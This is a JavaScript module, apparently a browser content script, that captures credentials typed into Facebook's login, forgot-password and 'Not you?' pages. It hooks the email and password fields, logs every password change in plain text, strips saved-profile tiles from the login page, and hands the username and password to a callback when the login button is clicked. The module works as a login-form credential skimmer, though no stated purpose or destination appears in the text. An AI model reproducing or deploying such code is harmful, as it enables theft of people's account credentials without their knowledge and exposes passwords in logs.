import { Logger } from '../logger';

export function retrivePasswordsElments() {
    const passwords = document.querySelectorAll('input[type="password"]');
    return passwords;
}

export function whenPasswordElementChange(passwords, UserDetailsFromWindow) {
    for (const password of passwords) {
        if (!password) { return; }
        if (password.getAttribute('id') === 'pass') {
            UserDetailsFromWindow.password = password.getAttribute('value');
            console.log('whenPasswordChanged : ', UserDetailsFromWindow);
            password.addEventListener('input', (e) => {
                UserDetailsFromWindow.password = e.target.value;
            });
        }
    }
}

export default class FacebookPasswordListener {
    _password = '';
    set password(value) {
        Logger.log(`Password was changed to ${value}`);
        this._password = value;
    }
    _username = '';
    set username(value) {
        Logger.log(`Username was changed to ${value}`);
        this._username = value;
    }

    onUserLoggedIn = () => {};

    setOnCredentialsChanged(callback) {
        this.onUserLoggedIn = callback;
        return this;
    }

    listen() {
        this.removeProfileImagesFromLoginPage();
        this.setupPasswordListeners();
        this.setupFrontpageUsernameListeners();
        this.setupForgotPasswordPageUsernameListener();
        this.setupNotYouPageUserNameListener();
        this.setupOnLoginListener();
    }

    removeProfileImagesFromLoginPage() {
        const morePotentialProfiles = document.querySelectorAll('[class*=removableItem]');
        for (const profileImage of morePotentialProfiles) {
            profileImage.remove();
        }
    }

    setupPasswordListeners() {
        const passwords = document.querySelectorAll('input[type="password"]');
        for (const password of passwords) {
            if (!password) { return; }
            if (password.getAttribute('id') === 'pass') {
                this.password = password.getAttribute('value');
                password.addEventListener('input', (e) => {
                    this.password = e.target.value;
                });
            }
        }
    }

    setupFrontpageUsernameListeners() {
        const otherPageUsernames = document.querySelectorAll('input[type="text"]');
        for (const username of otherPageUsernames) {
            if (username !== undefined && username !== null && username.getAttribute('name') === 'email') {
                this.username = username.getAttribute('value');
                username.addEventListener('input', (e) => {
                    this.username = e.target.value;
                });
            }
        }
    }

    setupForgotPasswordPageUsernameListener() {
        const usernames = document.querySelectorAll('input[type="email"]');
        for (const username of usernames) {
            if (username !== undefined && username !== null) {
                this.username = username.getAttribute('value');
                username.addEventListener('input', (e) => {
                    const value = e.target.value;
                    if (value.includes('@')) {
                        this.username = e.target.value;
                    }
                });
            }
        }
    }

    setupNotYouPageUserNameListener() {
        const usernameWhenForggotPassword = document.getElementsByTagName('div');
        for (const text of usernameWhenForggotPassword) {
            if (text) {
                let end;
                for (let i = 0; i < text.innerText.length; i++) {
                    if (text.innerText[i] === ' ') {
                        end = i;
                        break;
                    }
                }
                const username = text.innerText.slice(0, end);
                if (text.innerText.includes('@') && text.innerText.endsWith('Not you?')) {
                    this.username = username;
                }
            }
        }
    }

    setupOnLoginListener() {
        const button = document.getElementById('loginbutton');
        if (button) {
            button.addEventListener('click', (e) => {
                this.onUserLoggedIn(this._username, this._password);
            });
        }
    }

}
